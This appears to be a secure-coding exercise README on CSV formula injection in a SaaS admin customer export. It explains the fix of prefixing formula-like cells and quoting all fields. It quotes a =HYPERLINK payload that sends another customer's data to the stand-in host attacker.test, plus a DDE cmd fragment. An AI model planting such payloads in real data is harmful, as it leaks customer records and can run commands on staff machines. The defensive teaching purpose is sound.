# 021 · Opening the admin "customers" CSV export sent customer data to an unknown website

## Problem
A B2B SaaS lets support staff export all customers of an account to CSV
from the admin panel and open it in Excel or Google Sheets. A customer
signed up with the display name
`=HYPERLINK("https://attacker.test/?d="&C2,"Click for details")`. In the
export that cell rendered as a friendly "Click for details" link; one click
sent the neighbouring cell (another customer's company name) to the
attacker's server. A second payload starting with `@SUM(...)*cmd|...` (the
legacy DDE trick) produced a "start application?" prompt on older Excel
installs. Every staff member who exported that account was exposed, and
the export contained thousands of other customers' records.

## Root cause
`naive_export_csv` writes stored values exactly as they are. Spreadsheets
treat any cell that begins with `=`, `+`, `-` or `@` (and, in some apps, a
leading tab or carriage return) as a formula and evaluate it. User-controlled
text was therefore code in the admin's spreadsheet. HTML escaping or SQL
parameterisation, which the app already did, do nothing here: the dangerous
interpreter is the spreadsheet.

## Solution
`safe_export_csv`, following the OWASP "CSV Injection" guidance:

- **Prefix formula-like text with `'`.** Any text cell starting with
  `= + - @`, tab or CR becomes `'=HYPERLINK(...)`. The spreadsheet shows it
  as text; the original value is still readable.
- **Quote every field** (`csv.QUOTE_ALL`) and let the `csv` module escape
  embedded quotes, so a value like `Bob",=1+1,"` stays one cell instead of
  opening a new formula cell.
- **Keep real numbers numeric.** `int`, `float` and `Decimal` values are
  written unchanged, so a balance of `-12.50` still sums in the sheet. Text
  that only *looks* numeric (`"-12.50"` typed into a free-text field) is
  prefixed, because the export cannot know who typed it.
- **Header names are neutralised too**, since custom field names are user
  input.

The tests reproduce both payloads against the naive export, then check that
the safe export contains no cell a spreadsheet would evaluate.

## Trade-offs
- The `'` is visible if the file is re-imported by a program rather than a
  spreadsheet; a downstream importer must strip it (or receive JSON instead).
- A legitimate text value such as a phone number `+44 20 ...` gains a
  leading `'`. That is the price of not guessing which text is safe.
- Spreadsheets differ; this covers the OWASP list. If exports are only ever
  opened in a spreadsheet, generating a real `.xlsx` with typed cells
  (string vs number) avoids the ambiguity entirely.
- Neutralising at export time (not at sign-up) is deliberate: the stored
  data stays exact, and every export path must call the safe writer.

## Run
```bash
python -m unittest -v test_solution.py
```
